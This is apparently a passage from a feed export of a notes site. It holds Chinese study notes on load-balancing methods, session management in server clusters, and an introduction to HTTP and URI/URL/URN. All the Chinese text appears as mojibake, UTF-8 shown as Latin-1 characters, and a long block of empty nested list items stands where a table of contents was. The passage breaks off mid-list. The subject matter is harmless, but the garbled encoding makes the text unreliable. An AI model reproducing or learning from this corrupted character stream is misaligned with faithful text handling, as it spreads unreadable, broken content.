<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0f399a9f-1351-4b2d-b8a4-2ebe82b1a703.jpg" width="500px"/> </div><br>
<h2 id="è½¬å‘å®ç°" tabindex="-1"> è½¬å‘å®ç°</h2>
<h3 id="_1-http-é‡å®šå‘" tabindex="-1"> 1. HTTP é‡å®šå‘</h3>
<p>HTTP é‡å®šå‘è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ä½¿ç”¨æŸç§è´Ÿè½½å‡è¡¡ç®—æ³•è®¡ç®—å¾—åˆ°æœåŠ¡å™¨çš„ IP åœ°å€ä¹‹åï¼Œå°†è¯¥åœ°å€å†™å…¥ HTTP é‡å®šå‘æŠ¥æ–‡ä¸­ï¼ŒçŠ¶æ€ç ä¸º 302ã€‚å®¢æˆ·ç«¯æ”¶åˆ°é‡å®šå‘æŠ¥æ–‡ä¹‹åï¼Œéœ€è¦é‡æ–°å‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ã€‚</p>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>éœ€è¦ä¸¤æ¬¡è¯·æ±‚ï¼Œå› æ­¤è®¿é—®å»¶è¿Ÿæ¯”è¾ƒé«˜ï¼›</li>
<li>HTTP è´Ÿè½½å‡è¡¡å™¨å¤„ç†èƒ½åŠ›æœ‰é™ï¼Œä¼šé™åˆ¶é›†ç¾¤çš„è§„æ¨¡ã€‚</li>
</ul>
<p>è¯¥è´Ÿè½½å‡è¡¡è½¬å‘çš„ç¼ºç‚¹æ¯”è¾ƒæ˜æ˜¾ï¼Œå®é™…åœºæ™¯ä¸­å¾ˆå°‘ä½¿ç”¨å®ƒã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/02a1fbfd-7a9d-4114-95df-ca2445587a1f.jpg" width="500px"/> </div><br>
<h3 id="_2-dns-åŸŸåè§£æ" tabindex="-1"> 2. DNS åŸŸåè§£æ</h3>
<p>åœ¨ DNS è§£æåŸŸåçš„åŒæ—¶ä½¿ç”¨è´Ÿè½½å‡è¡¡ç®—æ³•è®¡ç®—æœåŠ¡å™¨ IP åœ°å€ã€‚</p>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>DNS èƒ½å¤Ÿæ ¹æ®åœ°ç†ä½ç½®è¿›è¡ŒåŸŸåè§£æï¼Œè¿”å›ç¦»ç”¨æˆ·æœ€è¿‘çš„æœåŠ¡å™¨ IP åœ°å€ã€‚</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>ç”±äº DNS å…·æœ‰å¤šçº§ç»“æ„ï¼Œæ¯ä¸€çº§çš„åŸŸåè®°å½•éƒ½å¯èƒ½è¢«ç¼“å­˜ï¼Œå½“ä¸‹çº¿ä¸€å°æœåŠ¡å™¨éœ€è¦ä¿®æ”¹ DNS è®°å½•æ—¶ï¼Œéœ€è¦è¿‡å¾ˆé•¿ä¸€æ®µæ—¶é—´æ‰èƒ½ç”Ÿæ•ˆã€‚</li>
</ul>
<p>å¤§å‹ç½‘ç«™åŸºæœ¬ä½¿ç”¨äº† DNS åšä¸ºç¬¬ä¸€çº§è´Ÿè½½å‡è¡¡æ‰‹æ®µï¼Œç„¶ååœ¨å†…éƒ¨ä½¿ç”¨å…¶å®ƒæ–¹å¼åšç¬¬äºŒçº§è´Ÿè½½å‡è¡¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒåŸŸåè§£æçš„ç»“æœä¸ºå†…éƒ¨çš„è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ IP åœ°å€ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d2c072cc-8b17-480c-813e-18cdb3b4b51f.jpg" width="500px"/> </div><br>
<h3 id="_3-åå‘ä»£ç†æœåŠ¡å™¨" tabindex="-1"> 3. åå‘ä»£ç†æœåŠ¡å™¨</h3>
<p>åå‘ä»£ç†æœåŠ¡å™¨ä½äºæºæœåŠ¡å™¨å‰é¢ï¼Œç”¨æˆ·çš„è¯·æ±‚éœ€è¦å…ˆç»è¿‡åå‘ä»£ç†æœåŠ¡å™¨æ‰èƒ½åˆ°è¾¾æºæœåŠ¡å™¨ã€‚åå‘ä»£ç†å¯ä»¥ç”¨æ¥è¿›è¡Œç¼“å­˜ã€æ—¥å¿—è®°å½•ç­‰ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ç”¨æ¥åšä¸ºè´Ÿè½½å‡è¡¡æœåŠ¡å™¨ã€‚</p>
<p>åœ¨è¿™ç§è´Ÿè½½å‡è¡¡è½¬å‘æ–¹å¼ä¸‹ï¼Œå®¢æˆ·ç«¯ä¸ç›´æ¥è¯·æ±‚æºæœåŠ¡å™¨ï¼Œå› æ­¤æºæœåŠ¡å™¨ä¸éœ€è¦å¤–éƒ¨ IP åœ°å€ï¼Œè€Œåå‘ä»£ç†éœ€è¦é…ç½®å†…éƒ¨å’Œå¤–éƒ¨ä¸¤å¥— IP åœ°å€ã€‚</p>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>ä¸å…¶å®ƒåŠŸèƒ½é›†æˆåœ¨ä¸€èµ·ï¼Œéƒ¨ç½²ç®€å•ã€‚</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>æ‰€æœ‰è¯·æ±‚å’Œå“åº”éƒ½éœ€è¦ç»è¿‡åå‘ä»£ç†æœåŠ¡å™¨ï¼Œå®ƒå¯èƒ½ä¼šæˆä¸ºæ€§èƒ½ç“¶é¢ˆã€‚</li>
</ul>
<h3 id="_4-ç½‘ç»œå±‚" tabindex="-1"> 4. ç½‘ç»œå±‚</h3>
<p>åœ¨æ“ä½œç³»ç»Ÿå†…æ ¸è¿›ç¨‹è·å–ç½‘ç»œæ•°æ®åŒ…ï¼Œæ ¹æ®è´Ÿè½½å‡è¡¡ç®—æ³•è®¡ç®—æºæœåŠ¡å™¨çš„ IP åœ°å€ï¼Œå¹¶ä¿®æ”¹è¯·æ±‚æ•°æ®åŒ…çš„ç›®çš„ IP åœ°å€ï¼Œæœ€åè¿›è¡Œè½¬å‘ã€‚</p>
<p>æºæœåŠ¡å™¨è¿”å›çš„å“åº”ä¹Ÿéœ€è¦ç»è¿‡è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ï¼Œé€šå¸¸æ˜¯è®©è´Ÿè½½å‡è¡¡æœåŠ¡å™¨åŒæ—¶ä½œä¸ºé›†ç¾¤çš„ç½‘å…³æœåŠ¡å™¨æ¥å®ç°ã€‚</p>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>åœ¨å†…æ ¸è¿›ç¨‹ä¸­è¿›è¡Œå¤„ç†ï¼Œæ€§èƒ½æ¯”è¾ƒé«˜ã€‚</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>å’Œåå‘ä»£ç†ä¸€æ ·ï¼Œæ‰€æœ‰çš„è¯·æ±‚å’Œå“åº”éƒ½ç»è¿‡è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ï¼Œä¼šæˆä¸ºæ€§èƒ½ç“¶é¢ˆã€‚</li>
</ul>
<h3 id="_5-é“¾è·¯å±‚" tabindex="-1"> 5. é“¾è·¯å±‚</h3>
<p>åœ¨é“¾è·¯å±‚æ ¹æ®è´Ÿè½½å‡è¡¡ç®—æ³•è®¡ç®—æºæœåŠ¡å™¨çš„ MAC åœ°å€ï¼Œå¹¶ä¿®æ”¹è¯·æ±‚æ•°æ®åŒ…çš„ç›®çš„ MAC åœ°å€ï¼Œå¹¶è¿›è¡Œè½¬å‘ã€‚</p>
<p>é€šè¿‡é…ç½®æºæœåŠ¡å™¨çš„è™šæ‹Ÿ IP åœ°å€å’Œè´Ÿè½½å‡è¡¡æœåŠ¡å™¨çš„ IP åœ°å€ä¸€è‡´ï¼Œä»è€Œä¸éœ€è¦ä¿®æ”¹ IP åœ°å€å°±å¯ä»¥è¿›è¡Œè½¬å‘ã€‚ä¹Ÿæ­£å› ä¸º IP åœ°å€ä¸€æ ·ï¼Œæ‰€ä»¥æºæœåŠ¡å™¨çš„å“åº”ä¸éœ€è¦è½¬å‘å›è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ï¼Œå¯ä»¥ç›´æ¥è½¬å‘ç»™å®¢æˆ·ç«¯ï¼Œé¿å…äº†è´Ÿè½½å‡è¡¡æœåŠ¡å™¨çš„æˆä¸ºç“¶é¢ˆã€‚</p>
<p>è¿™æ˜¯ä¸€ç§ä¸‰è§’ä¼ è¾“æ¨¡å¼ï¼Œè¢«ç§°ä¸ºç›´æ¥è·¯ç”±ã€‚å¯¹äºæä¾›ä¸‹è½½å’Œè§†é¢‘æœåŠ¡çš„ç½‘ç«™æ¥è¯´ï¼Œç›´æ¥è·¯ç”±é¿å…äº†å¤§é‡çš„ç½‘ç»œä¼ è¾“æ•°æ®ç»è¿‡è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ã€‚</p>
<p>è¿™æ˜¯ç›®å‰å¤§å‹ç½‘ç«™ä½¿ç”¨æœ€å¹¿è´Ÿè½½å‡è¡¡è½¬å‘æ–¹å¼ï¼Œåœ¨ Linux å¹³å°å¯ä»¥ä½¿ç”¨çš„è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ä¸º LVSï¼ˆLinux Virtual Serverï¼‰ã€‚</p>
<p>å‚è€ƒï¼š</p>
<ul>
<li><a href="http://www.jscape.com/blog/load-balancing-algorithms" target="_blank" rel="noopener noreferrer">Comparing Load Balancing Algorithms</a></li>
<li><a href="http://slideplayer.com/slide/6599069/#" target="_blank" rel="noopener noreferrer">Redirection and Load Balancing</a></li>
</ul>
<h1 id="äºŒã€é›†ç¾¤ä¸‹çš„-session-ç®¡ç†" tabindex="-1"> äºŒã€é›†ç¾¤ä¸‹çš„ Session ç®¡ç†</h1>
<p>ä¸€ä¸ªç”¨æˆ·çš„ Session ä¿¡æ¯å¦‚æœå­˜å‚¨åœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œé‚£ä¹ˆå½“è´Ÿè½½å‡è¡¡å™¨æŠŠç”¨æˆ·çš„ä¸‹ä¸€ä¸ªè¯·æ±‚è½¬å‘åˆ°å¦ä¸€ä¸ªæœåŠ¡å™¨ï¼Œç”±äºæœåŠ¡å™¨æ²¡æœ‰ç”¨æˆ·çš„ Session ä¿¡æ¯ï¼Œé‚£ä¹ˆè¯¥ç”¨æˆ·å°±éœ€è¦é‡æ–°è¿›è¡Œç™»å½•ç­‰æ“ä½œã€‚</p>
<h2 id="sticky-session" tabindex="-1"> Sticky Session</h2>
<p>éœ€è¦é…ç½®è´Ÿè½½å‡è¡¡å™¨ï¼Œä½¿å¾—ä¸€ä¸ªç”¨æˆ·çš„æ‰€æœ‰è¯·æ±‚éƒ½è·¯ç”±åˆ°åŒä¸€ä¸ªæœåŠ¡å™¨ï¼Œè¿™æ ·å°±å¯ä»¥æŠŠç”¨æˆ·çš„ Session å­˜æ”¾åœ¨è¯¥æœåŠ¡å™¨ä¸­ã€‚</p>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>å½“æœåŠ¡å™¨å®•æœºæ—¶ï¼Œå°†ä¸¢å¤±è¯¥æœåŠ¡å™¨ä¸Šçš„æ‰€æœ‰ Sessionã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1623f524-b011-40c8-b83f-eab38d538f76.png" width="400px"/> </div><br>
<h2 id="session-replication" tabindex="-1"> Session Replication</h2>
<p>åœ¨æœåŠ¡å™¨ä¹‹é—´è¿›è¡Œ Session åŒæ­¥æ“ä½œï¼Œæ¯ä¸ªæœåŠ¡å™¨éƒ½æœ‰æ‰€æœ‰ç”¨æˆ·çš„ Session ä¿¡æ¯ï¼Œå› æ­¤ç”¨æˆ·å¯ä»¥å‘ä»»ä½•ä¸€ä¸ªæœåŠ¡å™¨è¿›è¡Œè¯·æ±‚ã€‚</p>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>å ç”¨è¿‡å¤šå†…å­˜ï¼›</li>
<li>åŒæ­¥è¿‡ç¨‹å ç”¨ç½‘ç»œå¸¦å®½ä»¥åŠæœåŠ¡å™¨å¤„ç†å™¨æ—¶é—´ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/40c6570d-c1d7-4c38-843e-ba991b2328c2.png" width="400px"/> </div><br>
<h2 id="session-server" tabindex="-1"> Session Server</h2>
<p>ä½¿ç”¨ä¸€ä¸ªå•ç‹¬çš„æœåŠ¡å™¨å­˜å‚¨ Session æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ä¼ ç»Ÿçš„ MySQLï¼Œä¹Ÿä½¿ç”¨ Redis æˆ–è€… Memcached è¿™ç§å†…å­˜å‹æ•°æ®åº“ã€‚</p>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li>ä¸ºäº†ä½¿å¾—å¤§å‹ç½‘ç«™å…·æœ‰ä¼¸ç¼©æ€§ï¼Œé›†ç¾¤ä¸­çš„åº”ç”¨æœåŠ¡å™¨é€šå¸¸éœ€è¦ä¿æŒæ— çŠ¶æ€ï¼Œé‚£ä¹ˆåº”ç”¨æœåŠ¡å™¨ä¸èƒ½å­˜å‚¨ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯ã€‚Session Server å°†ç”¨æˆ·çš„ä¼šè¯ä¿¡æ¯å•ç‹¬è¿›è¡Œå­˜å‚¨ï¼Œä»è€Œä¿è¯äº†åº”ç”¨æœåŠ¡å™¨çš„æ— çŠ¶æ€ã€‚</li>
</ul>
<p>ç¼ºç‚¹ï¼š</p>
<ul>
<li>éœ€è¦å»å®ç°å­˜å– Session çš„ä»£ç ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/fdc45a09-f838-4348-8959-d2c793727788.png" width="600px"/> </div><br>
<p>å‚è€ƒï¼š</p>
<ul>
<li><a href="https://sivalabs.in/2018/02/session-management-using-spring-session-jdbc-datastore/" target="_blank" rel="noopener noreferrer">Session Management using Spring Session with JDBC DataStore</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸€ ã€HTTP ä»‹ç»</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/HTTP.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E7%BD%91%E7%BB%9C/HTTP.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="ä¸€-ã€http-ä»‹ç»" tabindex="-1"> ä¸€ ã€HTTP ä»‹ç»</h1>
<h2 id="http-ç®€ä»‹" tabindex="-1"> HTTP ç®€ä»‹</h2>
<p>HTTPåè®®ï¼Œå³è¶…æ–‡æœ¬ä¼ è¾“åè®®(Hypertext transfer protocol)ã€‚æ˜¯ä¸€ç§è¯¦ç»†è§„å®šäº†æµè§ˆå™¨å’Œä¸‡ç»´ç½‘(WWW = World Wide Web)æœåŠ¡å™¨ä¹‹é—´äº’ç›¸é€šä¿¡çš„è§„åˆ™ï¼Œé€šè¿‡å› ç‰¹ç½‘ä¼ é€ä¸‡ç»´ç½‘æ–‡æ¡£çš„æ•°æ®ä¼ é€åè®®ã€‚</p>
<p>HTTPåè®®ä½œä¸ºTCP/IPæ¨¡å‹ä¸­åº”ç”¨å±‚çš„åè®®ä¹Ÿä¸ä¾‹å¤–ã€‚HTTPåè®®é€šå¸¸æ‰¿è½½äºTCPåè®®ä¹‹ä¸Šï¼Œæœ‰æ—¶ä¹Ÿæ‰¿è½½äºTLSæˆ–SSLåè®®å±‚ä¹‹ä¸Šï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå°±æˆäº†æˆ‘ä»¬å¸¸è¯´çš„HTTPSã€‚å¦‚ä¸‹å›¾ï¼š</p>
<p><img src="@source/assets/cs-note/network/HTTPç®€ä»‹.png" alt="" loading="lazy"></p>
<p>HTTPæ˜¯ä¸€ä¸ªåº”ç”¨å±‚åè®®ï¼Œç”±è¯·æ±‚å’Œå“åº”æ„æˆï¼Œæ˜¯ä¸€ä¸ªæ ‡å‡†çš„å®¢æˆ·ç«¯æœåŠ¡å™¨æ¨¡å‹ã€‚HTTPæ˜¯ä¸€ä¸ªæ— çŠ¶æ€çš„åè®®ã€‚</p>
<p>HTTPé»˜è®¤çš„ç«¯å£å·ä¸º80ï¼ŒHTTPSçš„ç«¯å£å·ä¸º443ã€‚</p>
<p>æµè§ˆç½‘é¡µæ˜¯HTTPçš„ä¸»è¦åº”ç”¨ï¼Œä½†æ˜¯è¿™å¹¶ä¸ä»£è¡¨HTTPå°±åªèƒ½åº”ç”¨äºç½‘é¡µçš„æµè§ˆã€‚HTTPæ˜¯ä¸€ç§åè®®ï¼Œåªè¦é€šä¿¡çš„åŒæ–¹éƒ½éµå®ˆè¿™ä¸ªåè®®ï¼ŒHTTPå°±èƒ½æœ‰ç”¨æ­¦ä¹‹åœ°ã€‚æ¯”å¦‚å’±ä»¬å¸¸ç”¨çš„QQï¼Œè¿…é›·è¿™äº›è½¯ä»¶ï¼Œéƒ½ä¼šä½¿ç”¨HTTPåè®®(è¿˜åŒ…æ‹¬å…¶ä»–çš„åè®®)ã€‚</p>
<h2 id="http-ç‰¹ç‚¹" tabindex="-1"> HTTP ç‰¹ç‚¹</h2>
<ul>
<li>ç®€å•å¿«é€Ÿï¼šå®¢æˆ·å‘æœåŠ¡å™¨è¯·æ±‚æœåŠ¡æ—¶ï¼Œåªéœ€ä¼ é€è¯·æ±‚æ–¹æ³•å’Œè·¯å¾„ã€‚ç”±äºHTTPåè®®ç®€å•ï¼Œä½¿å¾—HTTPæœåŠ¡å™¨çš„ç¨‹åºè§„æ¨¡å°ï¼Œå› è€Œé€šä¿¡é€Ÿåº¦å¾ˆå¿«ã€‚</li>
<li>çµæ´»ï¼šHTTPå…è®¸ä¼ è¾“ä»»æ„ç±»å‹çš„æ•°æ®å¯¹è±¡ã€‚æ­£åœ¨ä¼ è¾“çš„ç±»å‹ç”±Content-TypeåŠ ä»¥æ ‡è®°ã€‚</li>
<li>HTTP 0.9å’Œ1.0ä½¿ç”¨éæŒç»­è¿æ¥ï¼šé™åˆ¶æ¯æ¬¡è¿æ¥åªå¤„ç†ä¸€ä¸ªè¯·æ±‚ï¼ŒæœåŠ¡å™¨å¤„ç†å®Œå®¢æˆ·çš„è¯·æ±‚ï¼Œå¹¶æ”¶åˆ°å®¢æˆ·çš„åº”ç­”åï¼Œå³æ–­å¼€è¿æ¥ã€‚HTTP 1.1ä½¿ç”¨æŒç»­è¿æ¥ï¼šä¸å¿…ä¸ºæ¯ä¸ªwebå¯¹è±¡åˆ›å»ºä¸€ä¸ªæ–°çš„è¿æ¥ï¼Œä¸€ä¸ªè¿æ¥å¯ä»¥ä¼ é€å¤šä¸ªå¯¹è±¡ï¼Œé‡‡ç”¨è¿™ç§æ–¹å¼å¯ä»¥èŠ‚çœä¼ è¾“æ—¶é—´ã€‚</li>
<li>æ— çŠ¶æ€ï¼šHTTPåè®®æ˜¯æ— çŠ¶æ€åè®®ã€‚æ— çŠ¶æ€æ˜¯æŒ‡åè®®å¯¹äºäº‹åŠ¡å¤„ç†æ²¡æœ‰è®°å¿†èƒ½åŠ›ã€‚ç¼ºå°‘çŠ¶æ€æ„å‘³ç€å¦‚æœåç»­å¤„ç†éœ€è¦å‰é¢çš„ä¿¡æ¯ï¼Œåˆ™å®ƒå¿…é¡»é‡ä¼ ï¼Œè¿™æ ·å¯èƒ½å¯¼è‡´æ¯æ¬¡è¿æ¥ä¼ é€çš„æ•°æ®é‡å¢å¤§ã€‚å¦ä¸€æ–¹é¢ï¼Œåœ¨æœåŠ¡å™¨ä¸éœ€è¦å…ˆå‰ä¿¡æ¯æ—¶å®ƒçš„åº”ç­”å°±è¾ƒå¿«ã€‚</li>
<li>æ”¯æŒB/SåŠC/Sæ¨¡å¼ã€‚</li>
</ul>
<h2 id="åŸºæœ¬æ¦‚å¿µ" tabindex="-1"> åŸºæœ¬æ¦‚å¿µ</h2>
<h3 id="uri-urn-url" tabindex="-1"> URI,URN,URL</h3>
<p>URI åŒ…å« URL å’Œ URNã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/8441b2c4-dca7-4d6b-8efb-f22efccaf331.png" width="500px"> </div><br>
<p><strong>URI æ˜¯uniform resource identifier</strong>ï¼Œç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼Œç”¨æ¥å”¯ä¸€çš„æ ‡è¯†ä¸€ä¸ªèµ„æºã€‚</p>
<p>URIä¸€èˆ¬ç”±ä¸‰éƒ¨ç»„æˆ</p>
<ul>
<li>è®¿é—®èµ„æºçš„å‘½åæœºåˆ¶</li>
<li>å­˜æ”¾èµ„æºçš„ä¸»æœºå</li>
<li>èµ„æºè‡ªèº«çš„åç§°ï¼Œç”±è·¯å¾„è¡¨ç¤ºï¼Œç€é‡å¼ºè°ƒäºèµ„æºã€‚</li>
</ul>
<p><strong>URL æ˜¯uniform resource locator</strong>ï¼Œç»Ÿä¸€èµ„æºå®šä½å™¨ï¼Œå®ƒæ˜¯ä¸€ç§å…·ä½“çš„URIï¼Œå³URLå¯ä»¥ç”¨æ¥æ ‡è¯†ä¸€ä¸ªèµ„æºï¼Œè€Œä¸”è¿˜æŒ‡æ˜äº†å¦‚ä½•locateè¿™ä¸ªèµ„æºã€‚</p>
<p>URLä¸€èˆ¬ç”±ä¸‰éƒ¨ç»„æˆ</p>
<ul>
<li>åè®®(æˆ–ç§°ä¸ºæœåŠ¡æ–¹å¼)</li>
<li>å­˜æœ‰è¯¥èµ„æºçš„ä¸»æœºIPåœ°å€(æœ‰æ—¶ä¹ŸåŒ…æ‹¬ç«¯å£å·)</li>
<li>ä¸»æœºèµ„æºçš„å…·ä½“åœ°å€ã€‚å¦‚ç›®å½•å’Œæ–‡ä»¶åç­‰</li>
</ul>
<p><strong>URN æ˜¯uniform resource name</strong>ï¼Œç»Ÿä¸€èµ„æºå‘½åï¼Œæ˜¯é€šè¿‡åå­—æ¥æ ‡è¯†èµ„æºï¼Œ</p>
<p>URIæ˜¯ä»¥ä¸€ç§æŠ½è±¡çš„ï¼Œé«˜å±‚æ¬¡æ¦‚å¿µå®šä¹‰ç»Ÿä¸€èµ„æºæ ‡è¯†ï¼Œè€ŒURLå’ŒURNåˆ™æ˜¯å…·ä½“çš„èµ„æºæ ‡è¯†çš„æ–¹å¼ã€‚URLå’ŒURNéƒ½æ˜¯ä¸€ç§URIã€‚ç¬¼ç»Ÿåœ°è¯´ï¼Œæ¯ä¸ª URL éƒ½æ˜¯ URIï¼Œä½†ä¸ä¸€å®šæ¯ä¸ª URI éƒ½æ˜¯ URLã€‚è¿™æ˜¯å› ä¸º URI è¿˜åŒ…æ‹¬ä¸€ä¸ªå­ç±»ï¼Œå³ç»Ÿä¸€èµ„æºåç§° (URN)ï¼Œå®ƒå‘½åèµ„æºä½†ä¸æŒ‡å®šå¦‚ä½•å®šä½èµ„æºã€‚</p>
<h1 id="äºŒã€http-å·¥ä½œæµç¨‹" tabindex="-1"> äºŒã€HTTP å·¥ä½œæµç¨‹</h1>
<h2 id="http-äº¤äº’æµç¨‹" tabindex="-1"> HTTP äº¤äº’æµç¨‹</h2>
<p>ä¸€æ¬¡HTTPæ“ä½œç§°ä¸ºä¸€ä¸ªäº‹åŠ¡ï¼Œå…¶å·¥ä½œè¿‡ç¨‹å¯åˆ†ä¸ºå››æ­¥ï¼š</p>
<ol>
<li>é¦–å…ˆå®¢æˆ·æœºä¸æœåŠ¡å™¨éœ€è¦å»ºç«‹è¿æ¥ï¼ŒHTTPçš„å·¥ä½œå¼€å§‹ã€‚</li>
<li>å»ºç«‹è¿æ¥åï¼Œå®¢æˆ·æœºå‘é€ä¸€ä¸ªè¯·æ±‚ç»™æœåŠ¡å™¨ï¼Œè¯·æ±‚æ–¹å¼çš„æ ¼å¼ä¸ºï¼šç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼ˆURLï¼‰ã€åè®®ç‰ˆæœ¬å·ï¼Œåè¾¹æ˜¯MIMEä¿¡æ¯åŒ…æ‹¬è¯·æ±‚ä¿®é¥°ç¬¦ã€å®¢æˆ·æœºä¿¡æ¯å’Œå¯èƒ½çš„å†…å®¹ã€‚</li>
<li>æœåŠ¡å™¨æ¥åˆ°è¯·æ±‚åï¼Œè¿›è¡Œå¤„ç†ï¼Œç„¶åå°†å¤„ç†ç»“æœå“åº”å®¢æˆ·ç«¯ï¼Œç»™äºˆç›¸åº”çš„å“åº”ä¿¡æ¯ï¼Œå…¶æ ¼å¼ä¸ºä¸€ä¸ªçŠ¶æ€è¡Œï¼ŒåŒ…æ‹¬ä¿¡æ¯çš„åè®®ç‰ˆæœ¬å·ã€ä¸€ä¸ªæˆåŠŸæˆ–é”™è¯¯çš„ä»£ç ï¼Œåè¾¹æ˜¯MIMEä¿¡æ¯åŒ…æ‹¬æœåŠ¡å™¨ä¿¡æ¯ã€å®ä½“ä¿¡æ¯å’Œå¯èƒ½çš„å†…å®¹ã€‚</li>
<li>å®¢æˆ·ç«¯æ¥æ”¶æœåŠ¡å™¨æ‰€è¿”å›çš„ä¿¡æ¯é€šè¿‡æµè§ˆå™¨æ˜¾ç¤ºåœ¨ç”¨æˆ·çš„æ˜¾ç¤ºå±ä¸Šï¼Œç„¶åå®¢æˆ·æœºä¸æœåŠ¡å™¨æ–­å¼€è¿æ¥ã€‚(HTTP1.1åä¸ä¼šç«‹å³å…³é—­)</li>
</ol>
<p>å¦‚æœåœ¨ä»¥ä¸Šè¿‡ç¨‹ä¸­çš„æŸä¸€æ­¥å‡ºç°é”™è¯¯ï¼Œé‚£ä¹ˆäº§ç”Ÿé”™è¯¯çš„ä¿¡æ¯å°†è¿”å›åˆ°å®¢æˆ·ç«¯ï¼Œæœ‰æ˜¾ç¤ºå±è¾“å‡ºã€‚å¯¹äºç”¨æˆ·æ¥è¯´ï¼Œè¿™äº›è¿‡ç¨‹æ˜¯ç”±HTTPè‡ªå·±å®Œæˆçš„ï¼Œç”¨æˆ·åªè¦ç”¨é¼ æ ‡ç‚¹å‡»ï¼Œç­‰å¾…ä¿¡æ¯æ˜¾ç¤ºå°±å¯ä»¥äº†ã€‚</p>
<h2 id="http-å·¥ä½œåŸç†" tabindex="-1"> HTTP å·¥ä½œåŸç†</h2>
<p>HTTPåè®®å®šä¹‰Webå®¢æˆ·ç«¯å¦‚ä½•ä»WebæœåŠ¡å™¨è¯·æ±‚Webé¡µé¢ï¼Œä»¥åŠæœåŠ¡å™¨å¦‚ä½•æŠŠWebé¡µé¢ä¼ é€ç»™å®¢æˆ·ç«¯ã€‚HTTPåè®®é‡‡ç”¨äº†è¯·æ±‚/å“åº”æ¨¡å‹ã€‚å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªè¯·æ±‚æŠ¥æ–‡ï¼Œè¯·æ±‚æŠ¥æ–‡åŒ…å«è¯·æ±‚çš„æ–¹æ³•ã€URLã€åè®®ç‰ˆæœ¬ã€è¯·æ±‚å¤´éƒ¨å’Œè¯·æ±‚æ•°æ®ã€‚æœåŠ¡å™¨ä»¥ä¸€ä¸ªçŠ¶æ€è¡Œä½œä¸ºå“åº”ï¼Œå“åº”çš„å†…å®¹åŒ…æ‹¬åè®®çš„ç‰ˆæœ¬ã€æˆåŠŸæˆ–è€…é”™è¯¯ä»£ç ã€æœåŠ¡å™¨ä¿¡æ¯ã€å“åº”å¤´éƒ¨å’Œå“åº”æ•°æ®ã€‚</p>
<p>ä»¥ä¸‹æ˜¯ HTTP è¯·æ±‚/å“åº”çš„æ­¥éª¤ï¼š</p>
<ol>
<li>å®¢æˆ·ç«¯è¿æ¥åˆ°WebæœåŠ¡å™¨
<ul>
